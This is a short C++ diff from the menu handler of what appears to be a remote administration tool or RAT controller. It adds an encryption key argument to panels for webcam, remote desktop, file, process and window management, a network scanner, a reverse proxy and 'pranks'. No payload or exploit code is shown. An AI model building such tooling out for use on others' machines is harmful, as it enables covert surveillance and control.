@@ -1867,31 +1867,31 @@ void MyListCtrl::OnModMenu(wxCommandEvent& event) {
         panelKey->Show();
     }
     else if (menuID == EnumMenuMods::ID_OnCamara) {
-        panelCamara* panelCam = new panelCamara(this, tmpSocket, this->strTmp.ToStdString());
+        panelCamara* panelCam = new panelCamara(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelCam->Show();
     }else if (menuID == EnumMenuMods::ID_OnEscritorioRemoto) {
-        frameRemoteDesktop* frameRemote = new frameRemoteDesktop(this, tmpSocket, this->strTmp.ToStdString());
+        frameRemoteDesktop* frameRemote = new frameRemoteDesktop(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         frameRemote->Show();
     }else if (menuID == EnumMenuMods::ID_OnAdminVentanas) {
-        panelWManager* panelWM = new panelWManager(this, tmpSocket, this->strTmp.ToStdString());
+        panelWManager* panelWM = new panelWManager(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelWM->Show();
     }else if (menuID == EnumMenuMods::ID_OnInfo) {
-        panelInformacion* panelINF = new panelInformacion(this, tmpSocket, this->strTmp.ToStdString());
+        panelInformacion* panelINF = new panelInformacion(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelINF->Show();
     }else if (menuID == EnumMenuMods::ID_OnEscanerRed) {
-        panelEscaner* panelSCAN = new panelEscaner(this, tmpSocket, this->strTmp.ToStdString());
+        panelEscaner* panelSCAN = new panelEscaner(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelSCAN->Show();
     }else if (menuID == EnumMenuMods::ID_OnBromas) {
-        panelFun* panelFUN = new panelFun(this, tmpSocket, this->strTmp.ToStdString());
+        panelFun* panelFUN = new panelFun(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelFUN->Show();
     }else if (menuID == EnumMenuMods::ID_OnAdminArchivos) {
-        panelFileManager* panelFM = new panelFileManager(this, tmpSocket, this->strTmp.ToStdString(), p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._strIp);
+        panelFileManager* panelFM = new panelFileManager(this, tmpSocket, this->strTmp.ToStdString(), p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._strIp, c_key);
         panelFM->Show();
     }else if (menuID == EnumMenuMods::ID_OnProxyInversa) {
-        panelReverseProxy* panelPROXY = new panelReverseProxy(this, tmpSocket, this->strTmp.ToStdString());
+        panelReverseProxy* panelPROXY = new panelReverseProxy(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelPROXY->Show();
     }else if (menuID == EnumMenuMods::ID_OnAdminProcesos) {
-        panelProcessManager* panelPM = new panelProcessManager(this, tmpSocket, this->strTmp.ToStdString());
+        panelProcessManager* panelPM = new panelProcessManager(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelPM->Show();
     }
     //Comandos de cliente, cerrar, reiniciar, actualizar, desinstalar
